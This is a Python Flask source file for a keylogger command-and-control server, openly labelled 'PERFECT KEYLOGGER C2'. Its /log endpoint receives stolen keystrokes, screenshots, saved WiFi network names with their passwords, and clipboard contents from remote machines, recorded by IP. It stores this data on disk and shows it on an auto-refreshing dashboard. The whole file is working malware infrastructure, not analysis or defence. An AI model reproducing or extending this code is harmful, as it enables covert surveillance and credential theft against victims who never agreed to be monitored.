from flask import Flask, request, jsonify, send_from_directory
import os
import json
import time
from datetime import datetime
from collections import deque
import base64
from PIL import Image
import io

app = Flask(__name__)
DATA_DIR = 'data'
os.makedirs(DATA_DIR, exist_ok=True)

# Categorized storage
live_data = {
    'keystrokes': deque(maxlen=50),
    'screenshots': deque(maxlen=20),
    'wifi': deque(maxlen=10),
    'clipboard': deque(maxlen=20),
    'system': deque(maxlen=20)
}

@app.route('/log', methods=['POST'])
def perfect_log():
    try:
        data = request.json
        timestamp = datetime.now().strftime('%H:%M:%S')
        ip = request.remote_addr
        
        # Categorize data
        if data.get('keystrokes'):
            live_data['keystrokes'].append({
                'ts': timestamp, 'ip': ip, 
                'keys': data['keystrokes']['raw'][-100:],
                'count': data['keystrokes']['count']
            })
        
        if data.get('screenshots'):
            live_data['screenshots'].append({
                'ts': timestamp, 'ip': ip,
                'screenshot': data['screenshots'][0],
                'size': data['screenshots'][0].get('size', 0)
            })
        
        if data.get('wifi_profiles'):
            live_data['wifi'].append({
                'ts': timestamp, 'ip': ip,
                'profiles': data['wifi_profiles']
            })
        
        if data.get('clipboard'):
            live_data['clipboard'].append({
                'ts': timestamp, 'ip': ip,
                'content': data['clipboard'][-1][:200]
            })
        
        # Save raw
        filename = f"{int(time.time()*1000)}_{ip.replace('.','_')}.json"
        filepath = os.path.join(DATA_DIR, filename)
        with open(filepath, 'w') as f:
            json.dump(data, f, indent=2)
        
        print(f"📥 [{ip}] {data.get('keystrokes', {}).get('count', 0)} keys + {len(data.get('screenshots', []))} ss")
        return jsonify({'status': 'PERFECT'}), 200
        
    except Exception as e:
        print(f"❌ {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/', methods=['GET'])
def perfect_dashboard():
    # Keystrokes HTML
    keystrokes_html = ''.join([
        f'<div class="capture"><span class="ip">{c["ip"]}</span> <span class="ts">{c["ts"]}</span>'
        f'<div class="keys">{c["keys"]}</div><small>{c["count"]} keys</small></div>'
        for c in list(live_data["keystrokes"])
    ])
    
    # Screenshots HTML  
    screenshots_html = ''.join([
        f'<div class="capture"><span class="ip">{c["ip"]}</span> <span class="ts">{c["ts"]}</span>'
        f'<img src="data:image/jpeg;base64,{c["screenshot"]["data"]}" class="screenshot" title="{c["screenshot"]["size"]} bytes"></div>'
        for c in list(live_data["screenshots"])
    ])
    
    # WiFi HTML
    wifi_items = []
    for c in list(live_data["wifi"]):
        profiles_html = ''.join([
            f'<div class="wifi-item"><strong>{p["ssid"]}</strong>: {p["password"]}</div>'
            for p in c.get("profiles", [])
        ])
        wifi_items.append(
            f'<div class="capture">{profiles_html}'
            f'</div><span class="ip">{c["ip"]}</span> <span class="ts">{c["ts"]}</span>'
        )
    wifi_html = ''.join(wifi_items)
    
    # Clipboard HTML
    clipboard_html = ''.join([
        f'<div class="capture clip-item"><span class="ip">{c["ip"]}</span> <span class="ts">{c["ts"]}</span>'
        f'<div>{c["content"]}</div></div>'
        for c in list(live_data["clipboard"])
    ])
    
    html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>🔥 PERFECT C2 DASHBOARD</title>
    <meta http-equiv="refresh" content="60;url=/">
    <style>
        * {{ margin:0; padding:0; box-sizing:border-box; }}
        body {{ font-family:'Consolas',monospace; background:#0a0a0a; color:#00ff88; padding:20px; }}
        .header {{ background:linear-gradient(90deg,#1a1a2e,#16213e); padding:25px; border-radius:15px; text-align:center; margin-bottom:25px; }}
        .stats {{ display:grid; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:20px; margin:20px 0; }}
        .stat {{ background:#16213e; padding:20px; border-radius:10px; text-align:center; border-left:4px solid #00ff88; }}
        .stat-num {{ font-size:32px; font-weight:bold; color:#00ff88; }}
        .category {{ background:#1a1a2e; margin:15px 0; padding:20px; border-radius:12px; border:1px solid #333; }}
        .category h2 {{ color:#00ff88; margin-bottom:15px; border-bottom:2px solid #00ff88; padding-bottom:8px; }}
        .capture {{ background:#0f0f23; margin:10px 0; padding:15px; border-radius:8px; border-left:4px solid #444; }}
        .keys {{ font-family:monospace; background:#000; padding:10px; border-radius:5px; white-space:pre-wrap; font-size:14px; }}
        .wifi-item, .clip-item {{ padding:8px; background:#111; margin:5px 0; border-radius:5px; }}
        .screenshot {{ max-width:300px; max-height:200px; border-radius:8px; cursor:pointer; }}
        .ip {{ color:#ff6b6b; font-weight:bold; }}
        .ts {{ color:#888; font-size:12px; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🔥 PERFECT KEYLOGGER C2</h1>
        <div class="stats">
            <div class="stat"><div class="stat-num">{len(live_data['keystrokes'])}</div><div>Keystrokes</div></div>
            <div class="stat"><div class="stat-num">{len(live_data['screenshots'])}</div><div>Screenshots</div></div>
            <div class="stat"><div class="stat-num">{len(live_data['wifi'])}</div><div>WiFi Profiles</div></div>
            <div class="stat"><div class="stat-num">{len(live_data['clipboard'])}</div><div>Clipboard</div></div>
        </div>
    </div>

    <!-- KEYSTROKES -->
    <div class="category">
        <h2>⌨️ LIVE KEYSTROKES</h2>
        {keystrokes_html}
    </div>

    <!-- SCREENSHOTS -->
    <div class="category">
        <h2>📸 SCREENSHOTS (30s)</h2>
        {screenshots_html}
    </div>

    <!-- WIFI -->
    <div class="category">
        <h2>📶 WIFI PROFILES</h2>
        {wifi_html}
    </div>

    <!-- CLIPBOARD -->
    <div class="category">
        <h2>📋 CLIPBOARD</h2>
        {clipboard_html}
    </div>

    <div style="text-align:center; padding:20px; color:#666; font-size:12px;">
        Files: <a href="/files" style="color:#00ff88;">{len([f for f in os.listdir(DATA_DIR) if os.path.isfile(os.path.join(DATA_DIR, f))])}</a>
    </div>
</body>
</html>
    """
    return html

@app.route('/files')
def list_files():
    files = [f for f in os.listdir(DATA_DIR) if os.path.isfile(os.path.join(DATA_DIR, f))]
    return '<br>'.join([f'<a href="/files/{f}">{f}</a>' for f in sorted(files)[-20:]])

@app.route('/files/<filename>')
def serve_file(filename):
    return send_from_directory(DATA_DIR, filename)

if __name__ == '__main__':
    print("🚀 PERFECT C2 SERVER - 60s Auto Refresh")
    app.run(host='0.0.0.0', port=5000, debug=False)